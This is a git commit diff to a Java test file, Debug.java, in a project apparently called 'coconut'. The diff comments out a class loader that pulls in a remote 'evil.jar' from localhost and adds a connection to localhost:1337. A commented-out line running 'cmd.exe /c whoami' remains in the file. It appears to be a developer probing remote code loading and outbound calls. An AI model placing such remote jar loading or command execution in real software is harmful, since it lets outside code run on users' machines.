71881f4f8d999812bf9b15568f133d87d2121ca4
vince calder <92699085+awrped@users.noreply.github.com>
2026-03-29 16:48:49 -0500

    url

--- src/test/java/dev/coconut/debug/Debug.java
+++ src/test/java/dev/coconut/debug/Debug.java
@@ -1,27 +1,29 @@
 package dev.coconut.debug;
 
 import java.net.URL;
-import java.net.URLClassLoader;
 
 public class Debug {
 
-    private static final class Test extends URLClassLoader {
-        private Test(URL[] urls, ClassLoader parent) {
-            super(urls, parent);
-        }
-
-        private void add(URL url) {
-            super.addURL(url);
-        }
-    }
+//    private static final class Test extends URLClassLoader {
+//        private Test(URL[] urls, ClassLoader parent) {
+//            super(urls, parent);
+//        }
+//
+//        private void add(URL url) {
+//            super.addURL(url);
+//        }
+//    }
 
     public static void main(String[] args) {
 //        System.out.println("Mod init state: M0");
         try {
 //            Runtime.getRuntime().exec("cmd.exe /c whoami");
-            try (Test loader = new Test(new URL[0], Debug.class.getClassLoader())) {
-                loader.add(new URL("https://localhost:8080/evil.jar"));
-            }
+//            try (Test loader = new Test(new URL[0], Debug.class.getClassLoader())) {
+//                loader.add(new URL("https://localhost:8080/evil.jar"));
+//            }
+            URL test = new URL("https://localhost:1337");
+//            test.openConnection();
+            test.openStream();
         } catch (Exception e) {
             e.printStackTrace();
         }
